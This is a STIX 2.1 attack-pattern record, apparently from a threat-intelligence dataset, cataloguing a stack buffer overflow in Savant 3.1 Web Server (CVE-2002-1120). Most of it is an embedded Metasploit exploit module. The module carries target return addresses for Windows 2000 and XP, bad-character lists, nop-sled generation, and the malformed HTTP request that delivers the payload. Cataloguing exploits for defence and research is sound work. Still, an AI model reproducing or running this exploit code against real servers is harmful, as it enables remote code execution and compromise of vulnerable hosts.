{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0f052129-4b8a-4e08-bc7d-0566ff681404",
    "created": "2024-08-14T16:52:17.375399Z",
    "modified": "2024-08-14T16:52:17.375403Z",
    "name": "Savant 3.1 Web Server Overflow",
    "description": " This module exploits a stack buffer overflow in Savant 3.1 Web Server. The service supports a maximum of 10 threads (for a default install). Each exploit attempt generally causes a thread to die whether successful or not. Therefore, in a default configuration, you only have 10 chances.  Due to the limited space available for the payload in this exploit module, use of the \"ord\" payloads is recommended. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/savant_31_overflow.rb",
            "external_id": "savant_31_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-1120"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /Savant\\/3\\.1/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Savant 3.1 Web Server Overflow',\n      'Description' => %q{\n          This module exploits a stack buffer overflow in Savant 3.1 Web Server. The service\n        supports a maximum of 10 threads (for a default install). Each exploit attempt\n        generally causes a thread to die whether successful or not. Therefore, in a default\n        configuration, you only have 10 chances.\n\n        Due to the limited space available for the payload in this exploit module, use of the\n        \"ord\" payloads is recommended.\n      },\n      'Author'      => [ 'aushack' ],\n      'Arch'\t\t  => [ ARCH_X86 ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2002-1120' ],\n          [ 'OSVDB', '9829' ],\n          [ 'BID', '5686' ],\n          [ 'EDB', '787' ]\n        ],\n      'Privileged'  => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'\t  =>\n        {\n          'Space'\t\t\t   => 253,\n          'BadChars'        => \"\\x00\\x0a\\x0d\\x25\",\n          'StackAdjustment' => -3500,\n          'Compat'          =>\n            {\n              'ConnectionType' => '+ws2ord',\n            },\n        },\n      'Platform'    => ['win'],\n      'Targets'     =>\n        [\n          # Patrick - Tested OK 2007/08/08 : w2ksp0, w2ksp4, xpsp2 en.\n          [ 'Universal Savant.exe', \t    { 'Ret' => 0x00417a96 } ], # p/r Savant.exe\n          [ 'Windows 2000 Pro All - English', { 'Ret' => 0x750211aa } ], # p/r ws2help.dll\n          [ 'Windows 2000 Pro All - Italian', { 'Ret' => 0x74fd2ac5 } ], # p/r ws2help.dll\n          [ 'Windows 2000 Pro All - French',  { 'Ret' => 0x74fa36b2 } ], # p/r ws2help.dll\n          [ 'Windows XP Pro SP2 - English',   { 'Ret' => 0x71ab76ed } ], # p/r ws2help.dll\n        ],\n      'DisclosureDate' => '2002-09-10',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    info = http_fingerprint  # check method\n    if info and (info =~ /Savant\\/3\\.1/)\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n\n  def safe_nops(count)\n    # We need to find a safe nop combination.\n    # Savant will change some chars in the http method type - anything before the \"/\".\n    #\n    # For example, \"GET /\" will remain \"GET /\", however\n    # \"\\xe0 /\" will be modified to \"\\xc0 /\" ...\n    # \"\\xfe /\" will be modified to \"\\xde /\" ...\n    # \"\\xff /\" will be modified to \"\\x9f /\"\n    # The code after the \"/\" - our payload - is unchanged >=)\n    #\n    # Savant bad_chars for the nops\n\n    bad_nop_chars = [*(0xe0..0xff)].pack(\"C*\")\n\n    nopsled = make_nops(count) # make_nops includes the payload bad_chars\n      bad_nop_chars.each_byte { |badbyte|\n        nopsled.each_byte { |goodbyte|\n        if (goodbyte == badbyte)\n          return false\n        end\n      }\n    }\n    return nopsled\n  end\n\n\n  def exploit\n    print_status(\"Searching for a suitable nopsled...\")\n    findnop = safe_nops(24) # If we use short jump or make_nops(), sled will be corrupted.\n    until findnop\n      findnop = safe_nops(24) # If nops are banned, generate a new batch.\n    end\n\n    print_status(\"Found one! Sending exploit.\")\n    sploit = findnop + \" /\" + payload.encoded + [target['Ret']].pack('V')\n    res = send_request_raw(\n      {\n        'method'  => sploit,\n        'uri'     => '/'\n      }, 5)\n    if (res)\n      print_error('The server responded, that can\\'t be good.')\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-09-10",
    "x_mitre_platforms": [
        "['win']"
    ]
}